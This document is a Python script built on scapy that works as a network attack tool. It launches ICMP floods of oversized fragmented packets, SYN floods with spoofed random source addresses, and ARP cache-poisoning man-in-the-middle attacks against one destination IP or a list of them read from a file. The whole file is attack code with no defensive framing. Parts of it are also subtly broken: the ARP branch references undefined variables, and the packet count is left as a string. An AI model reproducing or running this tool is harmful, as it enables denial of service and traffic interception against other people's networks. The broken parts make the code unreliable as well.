#! /usr/bin/env python

from scapy.all import *
import argparse
import threading #thread module imported
import time #time module
import os
import ipaddress
import sys

# Initialize parser
parser = argparse.ArgumentParser()

# Adding optional argument
parser.add_argument("-i", "--ip", help = "Destination IP Address")
parser.add_argument("-s", "--source", help = "Source IP Address")
parser.add_argument("--host", help = "Host IP Address")
parser.add_argument("--icmp", help = "ICMP Flood")
parser.add_argument("--syn", help = "SYN Flood")
parser.add_argument("--arp", help = "ARP Spoofing")
parser.add_argument("-n", "--number", help = "Number of packets")
parser.add_argument("-f", "--file", type=argparse.FileType('r'), help = "File with destination IP Addresses")


# Read arguments from command line
args = parser.parse_args() 

"""
---------FUNCTIONS---------
"""

#threads
def thread_delay(thread_name, delay, ip):
	time.sleep(delay)

	if args.source:
		print("Diplaying source as: % s" % args.source)
		ip_layer = IP(dst=args.ip, src=args.source)
	else:
		ip_layer = IP(dst=args.ip, src=RandIP("192.168.10.10/24"))


	if args.number:
		numPackets = args.number

	else:
		numPackets = 50

	if args.icmp:
 		send(numPackets*(fragment(ip_layer/ICMP()/"X"*60000)))

	if args.syn:
		tcp=TCP(sport=RandShort(), dport=80, flags="S")
		raw=Raw(b"x"*1024)
		p=ip_layer/tcp/raw
		print("Sending packets... Press CTRL+C to stop.")

		send(p, loop=1, verbose=0)

	if args.arp:
		if args.host: #METER UM ELSE A DIZER QUE ESTE HOST É OBRIGATORIO NO ARP
			try:
				gtw = ipaddress.ip_address(args.host)
			except:
				print('Address/netmask is invalid: %s' % args.host)
				exit(1)

			verbose = True
			enable_ip_route()
			try:
				while True:
					#telling the target that we are the host
					spoof(ip, host, verbose)
					#telling the host that we are the target
					spoof(host, ip, verbose)
					time.sleep(1)
			except KeyboardInterrupt:
				print("[!] Detected CTRL+C ! restoring the network, please wait...")
				restore(target, host)
				restore(host, target)
		else:
			print("Host IP address in mandatory!")
			exit(1)
	


#enable ip route (ip forward) in linux-based distro
def _enable_linux_iproute():
	file_path = "/proc/sys/net/ipv4/ip_forward"
	with open(file_path) as f:
		if f.read() == 1:
			#already enabled
			return
	with open(file_path, "w") as f:
		print(1, file=f)

def enable_ip_route(verbose=True):
	if verbose:
		print("[!] Enabling IP Routing...")
	_enable_linux_iproute()
	if verbose:
		print("[!] IP Routing enabled.")
		
def get_mac(ip):
	"""
	Returns MAC address of any device connected to the network
	If ip is down, returns None instead
	"""
	ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
	if ans:
		return ans[0][1].src
	
def spoof(target_ip, host_ip, verbose=True):
	"""
	Spoofs `target_ip` saying that we are `host_ip`.
	it is accomplished by changing the ARP cache of the target (poisoning)
	"""
	#get the mac of target
	target_mac=get_mac(target_ip)
	
	arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
	
	send(arp_response, verbose=0)
	
	if verbose:
		self_mac = ARP().hwsrc
		print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
		
def restore(target_ip, host_ip, verbose=True):
	#get the real MAC of target
	target_mac = get_mac(target_ip)
	#get the real Mac of spoofed
	host_mac = get_mac(host_ip)
	#crafting the restoring packet
	arp_response = ARP(pdst=target_ip,hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
	#send the restore packet 7 times
	send(arp_response, verbose=0, count=7)
	if verbose:
		print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

"""
--------------//-------------------------------
"""
if args.ip:
	try:
		ip = ipaddress.ip_address(args.ip)
		print('%s is a correct IP%s address.' % (ip, ip.version))
	except:
		print('Address/netmask is invalid: %s' % args.ip)
		exit(1)

	print("Destination: % s" % args.ip)

	if args.source:
		print("Diplaying source as: % s" % args.source)
		ip_layer = IP(dst=args.ip, src=args.source)
	else:
		ip_layer = IP(dst=args.ip, src=RandIP("192.168.10.10/24"))


	if args.number:
		numPackets = args.number

	else:
		numPackets = 50
	

	if args.icmp:
		send(numPackets*(fragment(ip_layer/ICMP()/"X"*60000)))

	if args.syn:
		tcp=TCP(sport=RandShort(), dport=80, flags="S")
		raw=Raw(b"x"*1024)
		p=ip_layer/tcp/raw
		print("Sending packets... Press CTRL+C to stop.")

		send(p, loop=1, verbose=0)

	if args.arp:
		if args.host: #METER UM ELSE A DIZER QUE ESTE HOST É OBRIGATORIO NO ARP
			try:
				gtw = ipaddress.ip_address(args.host)
			except:
				print('Address/netmask is invalid: %s' % args.host)
				exit(1)

			verbose = True
			enable_ip_route()
			try:
				while True:
					#telling the target that we are the host
					spoof(ip, host, verbose)
					#telling the host that we are the target
					spoof(host, ip, verbose)
					time.sleep(1)
			except KeyboardInterrupt:
				print("[!] Detected CTRL+C ! restoring the network, please wait...")
				restore(target, host)
				restore(host, target)
		else:
			print("Host IP address in mandatory!")
			exit(1)
			
	

else:
	if args.file:
		
		Lines = args.file.readlines()

		#argument validation 
		for line in Lines:
			if(line.strip() != ""):
    				
				try:
					ip = ipaddress.ip_address(line.strip())
					print('%s is a correct IP%s address.' % (ip, ip.version))
				except:
					print('Address/netmask is invalid: %s' % line)
					exit(1)
			

		count = 1;
		# Strips the newline character 
		for line in Lines: 
			
			if(line.strip() != ""):
				print("\nDestination:", line.strip())

				thread_n = threading.Thread(target=thread_delay, args=(count, 0, line.strip()))
				thread_n.start()
				count += 1
		
		# End with CTRL + C
		if args.number:
			try:
				time.sleep(0.5)
			except (KeyboardInterrupt, SystemExit):
				print("\n Terminating...")
				os._exit(1)
		else:
			try:
				print("\n Press CTRL+C to exit...")

				while True:
					time.sleep(0.5)
			except (KeyboardInterrupt, SystemExit):
				print("\n Terminating...")
				os._exit(1)

	
		
	else:
		print("Defining one/multiple destination IP Addresses is mandatory.")


